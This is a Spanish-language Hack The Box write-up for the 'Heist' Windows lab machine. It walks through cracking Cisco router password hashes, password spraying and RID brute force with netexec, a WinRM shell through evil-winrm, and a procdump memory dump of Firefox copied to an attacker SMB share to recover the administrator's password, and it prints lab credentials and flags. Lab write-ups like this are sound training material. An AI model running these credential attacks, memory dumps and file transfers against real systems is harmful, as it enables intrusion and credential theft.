---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/201
dificultad: Fácil
ip: 10.10.10.149
os: Windows
linked:
  - "[[Information Leakage]]"
  - "[[Cisco Password Cracker (password7)]]"
  - "[[procdump64.exe (Windows Sysinternals)]]"
  - "[[dump password]]"
  - "[[firefox]]"
  - "[[RID Brute Force]]"
---
# HackTheBox - Heist

## Reconocimiento

### Escaneo de puertos con Nmap

Para comenzar, realicé un escaneo de puertos con **Nmap** para identificar los servicios expuestos en la máquina. Utilicé los scripts por defecto y la detección de versiones para obtener una visión general clara.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
nmap -sCV -p80,135,445,5985,49669 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados revelaron varios puertos de interés:
- **Puerto 80/tcp**: Abierto y corriendo `Microsoft IIS httpd 10.0`. Este es mi principal punto de entrada para la enumeración web.
- **Puerto 135/tcp**: `msrpc`, típico en sistemas Windows.
- **Puerto 445/tcp**: `microsoft-ds`, lo que confirma que el servicio **SMB** está activo.
- **Puerto 5985/tcp**: `wsman`, indicando que **WinRM** está habilitado. Esto es una excelente noticia, ya que si obtengo credenciales, podría conseguir una sesión remota fácilmente. 💻
    

### Exploración del servidor web (IIS)

Al navegar a la dirección IP `http://10.10.10.149`, me encontré con un portal de inicio de sesión. La página ofrecía la opción de iniciar sesión como invitado, lo cual hice de inmediato.

Tras acceder como invitado, llegué a una sección de "Issues" (Incidencias). En esta página, encontré una publicación muy interesante sobre la configuración de un router Cisco. El post incluía un archivo adjunto que descargué para analizarlo.

### Análisis de la configuración de Cisco y crackeo de hashes

El archivo de configuración contenía hashes de contraseñas de Cisco. Tras una breve investigación, identifiqué dos tipos de hashes:
- **Tipo 7**: Este es un cifrado débil y fácilmente reversible.
- **Tipo 5**: Es un hash MD5 con salt, por lo que requiere un ataque de diccionario para ser crackeado.
    

Para los hashes de **Tipo 7**, utilicé una herramienta en línea (de Cisco) y obtuve dos contraseñas en texto plano:
- `$uperP@ssword`
- `Q4)sJu\Y8qz*A3?d`
    
Para el hash de **Tipo 5**, recurrí a **John the Ripper** y al popular diccionario `rockyou.txt`.
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John no tardó en crackear el hash, revelando la contraseña: `stealth1agent`. 🔑

Además de las contraseñas, la página de "Issues" mencionaba explícitamente dos nombres de usuario: `Hazard` y `Administrator`. Con esta lista de usuarios y contraseñas, mi siguiente paso fue intentar un ataque de password spraying.

---

## Explotación de vulnerabilidades

### Password Spraying y RID Brute Force

Con las credenciales `Hazard:stealth1agent`, utilicé **netexec** para verificar su validez contra el servicio SMB.
```Bash
netexec smb 10.10.10.149 -u Hazard -p 'stealth1agent'
```

¡Éxito! Las credenciales eran válidas. Intenté usarlas para iniciar una sesión con WinRM, pero falló, lo que sugiere que el usuario `Hazard` no pertenece al grupo "Remote Management Users".

Sin embargo, tener credenciales válidas me permite realizar una enumeración más profunda. Decidí llevar a cabo un ataque de **RID Brute Force** para descubrir más usuarios en el sistema.

> [!info] ¿Qué es un RID Brute Force? 🕵️‍♂️
> 
> En Windows, cada usuario tiene un Identificador de Seguridad (SID). El SID se compone de un identificador de dominio y un Identificador Relativo (RID). Mientras que el identificador de dominio es el mismo para todos los usuarios locales, el RID es único para cada uno. Un ataque de RID Brute Force consiste en iterar a través de posibles valores de RID (ej. 500 para Administrator, 1001, 1002...) para descubrir nombres de usuario válidos en el sistema.

Usé **netexec** de nuevo, esta vez con la opción `--rid-brute`, para automatizar este proceso.
```Bash
netexec smb 10.10.10.149 -u Hazard -p 'stealth1agent' --rid-brute
```
Este ataque reveló tres nuevos nombres de usuario: `support`, `Chase` y `Jason`.

Ahora, con una lista más grande de usuarios y mi colección de contraseñas, realicé otro ataque de password spraying.
```Bash
netexec smb 10.10.10.149 -u users.txt -p passwords.txt --continue-on-success
```
Este segundo intento dio sus frutos: encontré un nuevo par de credenciales válidas: `Chase:Q4)sJu\Y8qz*A3?d`.

### Acceso inicial vía WinRM

Con las credenciales del usuario `Chase`, intenté nuevamente conectarme a través de **WinRM** usando la herramienta **evil-winrm**.
```Bash
evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

¡Esta vez funcionó! 🔓 Obtuve una shell interactiva en el sistema como el usuario `Chase` y pude leer la primera bandera en `C:\Users\Chase\Desktop\user.txt`.

---

## Escalada de privilegios

### Enumeración interna y análisis de procesos

Una vez dentro, mi objetivo era escalar privilegios a `Administrator`. En el escritorio del usuario `Chase`, encontré un archivo `ToDo.txt`. Su contenido era una pista clave: Chase revisaba la lista de "Issues" con frecuencia.

Esto me llevó a pensar que probablemente estaba usando un navegador web para acceder al portal. Para confirmarlo, listé los procesos en ejecución.
```PowerShell
*Evil-WinRM* PS C:\Users\Chase\Desktop> ps
```
Efectivamente, vi un proceso `firefox.exe` en ejecución. Mi hipótesis fue que si Chase estaba logueado en el portal, sus credenciales de administrador podrían estar almacenadas en la memoria del proceso de Firefox.

### Volcado de memoria del proceso de Firefox

Para verificar mi teoría, necesitaba volcar la memoria del proceso `firefox.exe`. Utilicé la herramienta **procdump** de la suite Sysinternals. Primero, subí el ejecutable a la máquina víctima. Luego, identifiqué el PID del proceso de Firefox y ejecuté `procdump`.

> [!note]
> 
> Usé el flag -ma para asegurarme de que se realizara un volcado completo de la memoria del proceso, lo que aumenta las posibilidades de encontrar las credenciales.

```PowerShell
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump.exe -ma 5704 -accepteula firefox.dmp
```

### Exfiltración y análisis del volcado

Con el archivo de volcado de memoria (`firefox.dmp`) creado, necesitaba transferirlo a mi máquina para analizarlo. Para ello, levanté un servidor SMB rápido en mi equipo con **impacket-smbserver**.
```Bash
# En mi máquina atacante
impacket-smbserver.py -smb2support share .
```

Luego, desde la shell de `evil-winrm`, monté el recurso compartido y copié el archivo.
```PowerShell
*Evil-WinRM* PS C:\Users\Chase\Documents> net use \\10.10.14.17\share
*Evil-WinRM* PS C:\Users\Chase\Documents> copy firefox.dmp \\10.10.14.17\share\
```

Una vez que tuve el archivo en mi poder, utilicé la herramienta `strings` combinada con `grep` para buscar cadenas de texto relacionadas con el formulario de inicio de sesión. Recordando que la página web utilizaba un parámetro llamado `login_password`, busqué esa cadena en el volcado.
```Bash
strings firefox.dmp | grep "login_password"
```

El resultado fue exactamente lo que esperaba. Encontré una URL completa que contenía los parámetros del formulario, incluyendo el nombre de usuario y la contraseña del administrador en texto plano. 🚀

`login_user=Administrator&login_password=4dD!5%7Dx/re8%5DFBuZ`
La contraseña era `4dD!5}x/re8]FBuZ`.

### Acceso como Administrador

Con la contraseña del administrador en mi poder, solo quedaba un último paso. Utilicé `evil-winrm` una vez más para iniciar sesión como `Administrator`.
```Bash
evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
```

hecho, pude leer la bandera final en `C:\Users\Administrator\Desktop\root.txt`.


---

## Bandera(s)

> [!flag] `flag{user}`
> ce40b7b97b493961644dc79aa5a8a903
^bandera-user

> [!flag] `flag{root}`
> a6ec4b485c4b76b295cb4a51b399fa29
^bandera-root
